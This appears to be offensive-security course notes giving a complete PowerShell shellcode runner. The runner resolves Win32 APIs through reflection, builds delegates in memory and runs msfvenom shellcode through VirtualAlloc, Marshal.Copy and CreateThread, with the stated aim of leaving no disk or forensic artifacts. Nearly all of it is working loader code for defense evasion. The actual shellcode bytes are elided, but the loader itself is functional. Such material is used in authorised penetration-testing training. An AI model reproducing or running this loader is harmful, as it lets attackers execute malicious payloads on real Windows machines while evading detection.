# 02.02 PowerShell Reflection Shellcode Runner

> Listing 97 · LookupFunc + getDelegateType (no csc.exe on disk)

## Overview

Add-Type compiles C# and writes a temporary assembly to disk via csc.exe, leaving forensic artifacts. The reflection approach uses LookupFunc to resolve Win32 APIs via GetProcAddress from System.dll's UnsafeNativeMethods, and getDelegateType to build delegates on the fly — never touching disk.

## Steps

- **LookupFunc** — resolves a Win32 API address by calling GetModuleHandle + GetProcAddress through reflection on System.dll's UnsafeNativeMethods.
- **getDelegateType** — builds a delegate type at runtime via DefineDynamicAssembly so no .cs file or csc.exe is needed.
- **VirtualAlloc** — call through delegate with RWX (0x40) or RW then VirtualProtect to RX.
- **Marshal.Copy** — copy shellcode bytes into the allocated buffer.
- **CreateThread + WaitForSingleObject** — execute and wait via delegates.

## Commands

### LookupFunc helper

```powershell
function LookupFunc {
    Param ($moduleName, $functionName)
    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() |
        Where-Object { $_.GlobalAssemblyCache -and $_.Location.Split('\')[-1].
        Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp = @()
    $assem.GetMethods() | ForEach-Object {
        if ($_.Name -eq 'GetProcAddress') { $tmp += $_ }
    }
    return $tmp[0].Invoke($null, @(
        ($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)),
        $functionName
    ))
}
```

### getDelegateType helper

```powershell
function getDelegateType {
    Param ([Parameter(Position=0,Mandatory=$True)] [Type[]] $func,
           [Parameter(Position=1)] [Type] $delType = [Void])
    $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly(
        (New-Object System.Reflection.AssemblyName('ReflectedDelegate')),
        [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
        DefineDynamicModule('InMemoryModule', $false).
        DefineType('MyDelegateType','Class,Public,Sealed,AnsiClass,AutoClass',
            [System.MulticastDelegate])
    $type.DefineConstructor('RTSpecialName,HideBySig,Public',
        [System.Reflection.CallingConventions]::Standard,
        $func).SetImplementationFlags('Runtime,Managed')
    $type.DefineMethod('Invoke','Public,HideBySig,NewSlot,Virtual',
        $delType, $func).SetImplementationFlags('Runtime,Managed')
    return $type.CreateType()
}
```

### Full reflection shellcode runner

```powershell
# Requires LookupFunc and getDelegateType defined above
$lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (LookupFunc kernel32.dll VirtualAlloc),
    (getDelegateType @([IntPtr],[UInt32],[UInt32],[UInt32]) ([IntPtr])))
$buf = [Byte[]] (0xfc, 0x48  <# ... msfvenom -f ps1 output ... #>)
$hMem = $lpMem.Invoke([IntPtr]::Zero, $buf.Length, 0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $hMem, $buf.Length)
$crt = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (LookupFunc kernel32.dll CreateThread),
    (getDelegateType @([IntPtr],[UInt32],[IntPtr],[IntPtr],[UInt32],[IntPtr]) ([IntPtr])))
$hThread = $crt.Invoke([IntPtr]::Zero, 0, $hMem, [IntPtr]::Zero, 0, [IntPtr]::Zero)
$wfso = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (LookupFunc kernel32.dll WaitForSingleObject),
    (getDelegateType @([IntPtr],[Int32]) ([Int32])))
$wfso.Invoke($hThread, 0xFFFFFFFF)
```
